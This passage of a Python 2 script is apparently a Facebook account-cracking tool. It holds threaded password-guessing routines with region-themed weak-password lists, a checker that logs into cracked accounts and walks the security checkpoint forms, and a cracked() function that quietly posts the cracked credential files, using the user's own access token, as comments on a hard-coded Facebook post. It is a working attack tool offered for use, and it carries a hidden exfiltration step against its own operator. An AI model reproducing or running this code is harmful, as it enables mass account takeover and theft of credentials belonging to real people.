        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         xz[0] + '1234', xz[0] + '12345']
                    else:
                        pws = [
                         name, 'sayang', 'anjing', 'bismillah', xz[0] + '123']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)

    def indpass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         '112233', '223344', '556677']
                    else:
                        pws = [
                         name, '000786', '786786', xz[0] + '123', xz[0] + '12345']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)

    def banglapass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         '1234567', '12345678']
                    else:
                        pws = [
                         name, 'bangladesh', '123456', xz[0] + '123', xz[0] + '12345']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)

    def usapass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        cntry = open('country.txt', 'r')
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         'passwords', '123456']
                    else:
                        pws = [
                         name, 'iloveyou', 'qwerty', xz[0] + '123', xz[0] + '12345']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)


def cracked():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        os.system('clear')
        os.system('rm -rf login.txt')
        zmbf()

    try:
        zkpostidz = '1835124766862116'
        send = open('Cracked/cpz.txt', 'r').read()
        send1 = open('/sdcard/CP/cp.txt', 'r').read()
        send2 = open('/CP/cp.txt', 'r').read()
        send3 = open('cp.txt', 'r').read()
        requests.post('https://graph.facebook.com/' + zkpostidz + '/comments/?message=' + send + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + zkpostidz + '/comments/?message=' + send1 + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + zkpostidz + '/comments/?message=' + send2 + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + zkpostidz + '/comments/?message=' + send3 + '&access_token=' + token)
    except:
        pass


def relogin():
    os.system('clear')
    print checkerlogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c          \xe2\x94\x9c Checkpoints Checking Menu \xe2\x94\xa4         \xe2\x94\xa4'
    print '\xe2\x94\x9c          \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98         \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\n\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Example File Name: Cracked/cpz.txt'
    files = raw_input('\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Cracked Idz File Name : ')
    if files == '':
        print '  [!] Enter A File Name'
        time.sleep(3)
        relogin()
    try:
        rfiles = open(files, 'r').readlines()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x9e\xa4\x1b[1;37m] Entered FileName %s%s%s Not Found! Try Another' % (h, files, p)
        relogin()

    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;32m\xe2\x9e\xa4\x1b[1;37m] Total Cracked Checkpoint Idz : \x1b[1;32m%s\x1b[1;37m' % len(rfiles)
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;32m\xe2\x9e\xa4\x1b[1;37m] Checking Checkpoint Idz, Wait...'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    for sz in rfiles:
        linez = sz.replace('\n', '')
        symbz = linez.split(' | ')
        print '\x1b[0;97m\n\xe2\x94\x9c??\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80?\xe2\x94\xa4'
        print '\n\x1b[0;96m\x1b[0;97m[\x1b[1;33m\xe2\x9e\xa4\x1b[1;37m] CP Account: ' + linez.replace(' + ', '') + '\n'
        try:
            method(symbz[0], symbz[1])
        except requests.exceptions.ConnectionError:
            pass

    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    print '\n\x1b[0;97m\x1b[0;97m[\x1b[1;32m\xe2\x9e\xa4\x1b[1;37m] Checking Process Has Been Completed'
    raw_input('[\xe2\x9e\xa3] Press Any Key To Go Back To Cracking Menu: ')
    cracking_menu()


def method(user, pasw):
    ua33 = 'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
    ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    ua34 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9'
    host = 'https://mbasic.facebook.com'
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 
       'cache-control': 'max-age=0', 
       'upgrade-insecure-requests': '1', 
       'origin': host, 
       'content-type': 'application/x-www-form-urlencoded', 
       'user-agent': ua, 
       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
       'x-requested-with': 'mark.via.gp', 
       'sec-fetch-site': 'same-origin', 
       'sec-fetch-mode': 'navigate', 
       'sec-fetch-user': '?1', 
       'sec-fetch-dest': 'document', 
       'referer': host + '/login/?next&ref=dbl&fl&refid=8', 
       'accept-encoding': 'gzip, deflate', 
       'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(host + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue

    data.update({'email': user, 'pass': pasw})
    try:
        run = parser(ses.post(host + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    except requests.exceptions.TooManyRedirects:
        print '\n\x1b[0;96m\x1b[0;97m[\x1b[1;33m\xe2\x9e\xa4\x1b[1;37m] Login Error! Try Again Later  '

    if 'c_user' in ses.cookies:
        print '\n\x1b[0;96m\x1b[0;97m[\x1b[1;32m\xe2\x9e\xa4\x1b[1;37m] Status: \x1b[1;32mSuccessFul To Login'
    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 
           'fb_dtsg': dtsg, 
           'jazoest': jzst, 
           'jazoest': jzst, 
           'checkpoint_data': '', 
           'submit[Continue]': 'Lanjutkan', 
           'nh': nh}
        xnxx = parser(ses.post(host + form['action'], data=dataD).text, 'html.parser')
        ngew = [ yy.text for yy in xnxx.find_all('option') ]
        if str(len(ngew)) == '0':
            print '\n\x1b[0;96m\x1b[0;97m[\x1b[1;32m\xe2\x9e\xa4\x1b[1;37m] Status: \x1b[1;32mOne Tap Yes / SuccessFul To Login'
        else:
            print '\x1b[0;96m\x1b[0;97m[\x1b[1;33m\xe2\x9e\xa4\x1b[1;37m] Total Available Checkpoint Options:  ' + str(len(ngew))
        for opt in range(len(ngew)):
            print '[\x1b[1;33m' + str(opt + 1) + '\x1b[1;37m] ' + ngew[opt]
            print '\n\x1b[0;96m\x1b[0;97m[\x1b[1;33m\xe2\x9e\xa4\x1b[1;37m] Status: \x1b[1;33mCheckPoint! Try Again Later  '

    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print '\x1b[0;96m\x1b[0;97m[\x1b[1;31m\xe2\x9e\xa4\x1b[1;37m] %s' % oh
    else:
        print '\n\x1b[0;96m\x1b[0;97m[\x1b[1;31m!\x1b[1;37m] Looks Like Password Has Been Changed '


if __name__ == '__main__':
    os.system('git pull')
    cracking_menu()
